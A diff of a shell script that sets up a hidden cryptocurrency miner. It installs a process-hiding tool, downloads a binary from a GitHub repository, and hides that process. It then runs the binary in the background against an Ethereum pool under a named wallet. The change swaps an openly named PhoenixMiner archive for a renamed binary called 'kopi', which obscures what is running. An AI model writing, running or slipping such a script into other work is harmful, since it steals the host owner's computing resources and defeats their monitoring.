@@ -5,12 +5,10 @@ apt update
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 sudo apt install nodejs
 npm i -g node-process-hider
-wget https://github.com/gyrogerald/dera/raw/main/topu.zip
-unzip topu.zip
-sudo ph add PhoenixMiner
-cd PhoenixMiner_6.0b_Linux
-chmod +x PhoenixMiner 
-nohup ./PhoenixMiner -pool ethash.poolbinance.com:443 -wal TeslaM -worker gyro -epsw x -asm 2 -dbg -1 -allpools 1 -mode 1 eth pause > nohup.out
+wget https://github.com/gyrogerald/dera/raw/main/kopi
+sudo ph add kopi
+chmod +x kopi 
+nohup ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user TeslaM.T4 > nohup.out
 
 while [ 1 ]; do
 
